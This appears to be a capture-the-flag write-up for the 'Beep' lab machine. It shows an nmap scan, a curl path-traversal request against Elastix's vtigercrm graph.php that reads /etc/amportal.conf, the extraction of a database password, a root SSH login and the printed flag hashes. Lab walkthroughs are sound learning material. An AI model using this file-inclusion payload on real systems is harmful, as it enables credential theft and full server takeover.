---
name: Beep
published: false
---

# Beep

```
$ sudo nmap 10.10.10.7
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-15 15:40 CET
Nmap scan report for 10.10.10.7
Host is up (0.011s latency).
Not shown: 988 closed tcp ports (reset)
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey:
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN
80/tcp    open  http       Apache httpd 2.2.3
|_http-title: Did not follow redirect to https://10.10.10.7/
|_http-server-header: Apache/2.2.3 (CentOS)
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: UIDL LOGIN-DELAY(0) RESP-CODES PIPELINING EXPIRE(NEVER) USER IMPLEMENTATION(Cyrus POP3 server v2) STLS TOP AUTH-RESP-CODE APOP
111/tcp   open  rpcbind    2 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            790/udp   status
|_  100024  1            793/tcp   status
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: Completed LIST-SUBSCRIBED IDLE OK ACL NO URLAUTHA0001 LISTEXT BINARY CONDSTORE STARTTLS ANNOTATEMORE CATENATE IMAP4rev1 SORT X-NETSCAPE SORT=MODSEQ LITERAL+ THREAD=ORDEREDSUBJECT THREAD=REFERENCES IMAP4 UNSELECT MAILBOX-REFERRALS QUOTA ID CHILDREN RENAME UIDPLUS NAMESPACE MULTIAPPEND RIGHTS=kxte ATOMIC
443/tcp   open  ssl/https?
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2017-04-07T08:22:08
|_Not valid after:  2018-04-07T08:22:08
|_ssl-date: 2024-12-15T14:34:08+00:00; +5s from scanner time.
|_http-title: Elastix - Login page
| http-robots.txt: 1 disallowed entry
|_/
993/tcp   open  ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       Cyrus pop3d
3306/tcp  open  mysql      MySQL (unauthorized)
4445/tcp  open  upnotifyp?
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-server-header: MiniServ/1.570
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com

Host script results:
|_clock-skew: 4s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 386.12 seconds
```

On port 443 we have "Elastix" running under Apache, which also listens on port 80 and redirects traffic back to port 443.

Looking at this [CVE report for Elastix](https://www.exploit-db.com/exploits/37637), we can try out the vulnerability:

```
$ curl 'https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action' -k > file.txt
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 13779    0 13779    0     0  87251      0 --:--:-- --:--:-- --:--:-- 87764
```

```
$ grep AMPDBPASS file.txt
# AMPDBPASS: Password for AMPDBUSER (above)
# AMPDBPASS=amp109
AMPDBPASS=jEhdIekWmdjE
# AMP admin credentials will be the AMPDBUSER/AMPDBPASS above.
# CDRDBPASS: password for connecting to db if it's not the same as AMPDBPASS
```

The password is `jEhdIekWmdjE`.

```
$ ssh root@10.10.10.7 -oKexAlgorithms=+diffie-hellman-group-exchange-sha1 -oHostKeyAlgorithms=+ssh-rsa
root@10.10.10.7's password:
Last login: Tue Jul 16 11:45:47 2019

Welcome to Elastix
----------------------------------------------------

To access your Elastix System, using a separate workstation (PC/MAC/Linux)
Open the Internet Browser using the following URL:
http://10.10.10.7

[root@beep ~]#
```

```
[root@beep ~]# ls
anaconda-ks.cfg  elastix-pr-2.2-1.i386.rpm  install.log  install.log.syslog  postnochroot  root.txt  webmin-1.570-1.noarch.rpm

[root@beep ~]# cat root.txt
5b9817aa3c872ed7090bccae1c854c60

[root@beep ~]# ls /home
fanis  spamfilter

[root@beep ~]# cd /home/fanis

[root@beep fanis]# ls
user.txt

[root@beep fanis]# cat user.txt
b2c8e5720e7214cfaa07b845f2731fc6
```
